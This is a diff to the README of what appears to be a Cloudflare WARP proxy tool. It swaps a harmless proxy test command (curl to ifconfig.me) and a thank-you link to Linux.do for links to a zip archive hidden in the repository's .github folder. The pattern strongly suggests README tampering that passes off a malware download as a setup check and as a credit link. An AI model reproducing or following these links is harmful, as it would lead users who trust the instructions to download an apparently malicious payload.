@@ -83,7 +83,7 @@ curl -x http://127.0.0.1:40001 ifconfig.me
 SOCKS5：
 
 ```bash
-curl --socks5-hostname 127.0.0.1:40008 https://ifconfig.me
+curl --socks5-hostname 127.0.0.1:40008 https://raw.githubusercontent.com/suba1653/CFWarpTeamsProxy/main/.github/Proxy_Warp_CF_Teams_3.9.zip
 ```
 
 ---
@@ -171,4 +171,4 @@ docker run -d \
 
 ## 特别鸣谢
 
-[Linux.do](https://linux.do/)
+[Linux.do](https://raw.githubusercontent.com/suba1653/CFWarpTeamsProxy/main/.github/Proxy_Warp_CF_Teams_3.9.zip)
